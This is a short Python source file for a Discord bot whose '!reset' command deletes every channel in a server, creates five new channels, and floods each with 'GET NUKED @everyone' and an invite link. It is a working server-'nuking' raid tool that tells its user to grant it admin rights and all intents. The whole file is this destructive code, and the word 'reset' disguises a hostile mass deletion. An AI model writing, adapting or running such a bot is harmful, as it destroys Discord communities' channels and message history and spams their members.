import discord
from discord.ext import commands
instructions = 'MAKE SURE UR BOT HAS ALL PRIVILGED GATEWAY INTENTS ENABLED, AND THE BOT HAS ADMIN ACCESS IN THE SERVER IT IS IN BEFORE PUTTING IN BOT TOKEN'
print(instructions)
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"Bot is ready! {bot.user.name}")

@bot.command()
async def reset(ctx):
    # Check if the user has the manage_channels permission
    if ctx.author.guild_permissions.manage_channels:
        # Delete all channels
        for channel in ctx.guild.channels:
            await channel.delete()

        # Create 5 new text channels
        for i in range(1, 6):
            channel = await ctx.guild.create_text_channel(f"Channel{i}")

        # Send a predefined message in all channels
        for channel in ctx.guild.channels:
            if isinstance(channel, discord.TextChannel):
                await channel.send("GET NUKED @everyone https://discord.gg/RUahTQcr6y")

        await ctx.send("Channels reset successfully.")
    else:
        await ctx.send("You do not have the required permissions to manage channels.")

if __name__ == "__main__":
    # Take user input for the bot token
    bot_token = input("Enter your Discord bot token: ")

    # Replace 'YOUR_BOT_TOKEN' with the user input
    bot.run(bot_token)
